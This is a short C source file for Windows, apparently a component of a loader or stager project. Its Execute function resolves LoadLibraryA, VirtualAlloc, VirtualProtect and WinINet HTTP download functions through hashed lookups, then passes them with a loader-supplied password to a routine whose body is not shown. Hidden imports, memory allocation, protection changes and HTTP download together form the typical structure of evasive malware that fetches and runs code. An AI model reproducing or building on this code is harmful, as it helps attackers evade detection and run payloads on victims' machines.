#include <windows.h>
#include "../src_common/common.h"
#include "main.h"


int Execute(LPCWSTR PasswdFromLoader){
	API Api;

	Api._LoadLibraryA = (tLoadLibraryA)getFunctionPtr(H_LIB_KERNEL32, H_API_LOADLIBRARYA);
	Api._VirtualAlloc = (tVirtualAlloc)getFunctionPtr(H_LIB_KERNEL32, H_API_VIRTUALALLOC);
	Api._VirtualProtect = (tVirtualProtect)getFunctionPtr(H_LIB_KERNEL32, H_API_VIRTUALPROTECT);
	Api._printf = (tprintf)getFunctionPtr(H_LIB_MSVCRT, H_API_PRINTF);
	Api._HttpOpenRequestA = (tHttpOpenRequestA)getFunctionPtr(H_LIB_WININET, H_API_HTTPOPENREQUESTA);
	Api._HttpSendRequestA = (tHttpSendRequestA)getFunctionPtr(H_LIB_WININET, H_API_HTTPSENDREQUESTA);
	Api._InternetCloseHandle = (tInternetCloseHandle)getFunctionPtr(H_LIB_WININET, H_API_INTERNETCLOSEHANDLE);
	Api._InternetConnectA = (tInternetConnectA)getFunctionPtr(H_LIB_WININET, H_API_INTERNETCONNECTA);
	Api._InternetOpenA = (tInternetOpenA)getFunctionPtr(H_LIB_WININET, H_API_INTERNETOPENA);
	Api._InternetReadFile = (tInternetReadFile)getFunctionPtr(H_LIB_WININET, H_API_INTERNETREADFILE);
	Mmain(Api, PasswdFromLoader);
	return 0;
}
